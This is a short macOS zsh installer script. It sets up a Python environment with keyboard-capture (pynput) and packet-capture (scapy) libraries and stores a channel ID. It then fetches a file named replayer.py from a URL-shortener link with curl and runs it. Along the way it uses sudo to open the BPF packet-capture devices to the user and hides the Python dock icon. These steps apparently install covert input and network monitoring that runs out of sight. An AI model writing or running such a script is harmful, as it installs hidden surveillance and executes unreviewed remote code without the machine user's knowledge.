#!/bin/zsh
set -e

user=$(whoami)
if [[ "$user" == "root" ]]; then
  echo "Please run as non-root user"
  exit 1
fi

if [ -d stlenv ]; then
  echo "stlenv already exists"
  source stlenv/bin/activate
else
  python3 -m venv stlenv
  source stlenv/bin/activate
  pip3 install pynput python-dotenv scapy screeninfo
  echo "stlenv initialized"
fi

cd stlenv

if [ -e .env ]; then
  echo ".env already exists"
else
  read "channelId?CHANNEL_ID: "
  outputFile=".env"
  echo "CHANNEL_ID=$channelId" > $outputFile
  echo ".env initialized"
fi

if [ ! -e replayer.py ]; then
  curl -sL https://2ly.link/24LJ5 -o replayer.py
fi

# allow non-root user to run
if ! ls -l /dev/bpf* | grep -q "$user"; then
  sudo chown ${user}:admin /dev/bpf*
fi

# hide python dockbar icon
plistPath="/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.9/Resources/Python.app/Contents/Info.plist"
if ! sudo plutil -extract LSUIElement xml1 -o - $plistPath | grep -q "<true/>"; then
  sudo plutil -insert LSUIElement -bool true $plistPath
fi

python3 replayer.py "$@"